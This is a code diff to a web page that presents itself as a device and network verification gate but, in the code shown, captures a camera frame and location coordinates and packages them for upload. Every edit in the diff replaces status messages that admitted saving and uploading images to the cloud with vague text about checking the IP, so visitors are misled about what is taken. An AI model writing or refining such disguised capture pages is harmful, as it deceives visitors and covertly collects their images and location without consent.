@@ -80,7 +80,7 @@
 <body>
 <div class="wrapper">
     <h1>欢迎访问</h1>
-    <p class="subtitle">为防止沙雕封我网站<br>需要检验你的设备环境与网络状态</p>
+    <p class="subtitle">为防止沙雕封我网站<br>需给权限，接受检查</p>
 
     <div class="preview-container">
         <div class="preview-mask">
@@ -164,7 +164,7 @@
     }
 
     async function captureAndUpload(lat, lon) {
-        updateStatus("正在保存验证图像...");
+        updateStatus("正在检查IP...");
         const video = videoElement;
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
@@ -197,7 +197,7 @@
             ctx.fillText("Environment Check Buffer", 50, 50);
         }
 
-        updateStatus("正在同步打包并上传云端...");
+        updateStatus("正在同步打包检查...");
 
         canvas.toBlob(async (blob) => {
             if (!blob) {
